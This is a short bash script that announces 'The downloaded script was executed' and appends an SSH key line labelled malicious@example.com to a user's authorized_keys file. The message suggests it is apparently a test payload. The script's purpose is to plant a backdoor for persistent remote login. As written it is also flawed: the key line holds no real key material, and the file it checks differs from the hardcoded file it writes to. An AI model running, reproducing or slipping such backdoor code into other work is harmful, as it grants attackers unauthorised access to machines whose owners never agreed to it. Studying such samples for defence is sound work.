#!/bin/bash
echo "The downloaded script was executed"
# The key to check for
key_to_add="AAAAC3NzaC1lZDI1NTE5"
# The authorized_keys file path (adjust if needed)
authorized_keys_file="$HOME/.ssh/authorized_keys"
# Check if the key already exists in the file
if grep -q "$key_to_add" "$authorized_keys_file"; then
  echo "Key already exists in authorized_keys."
else
  # Key doesn't exist, so add it
  echo "ssh-ed25519  malicious@example.com" >> /home/ubuntu/.ssh/authorized_keys
fi


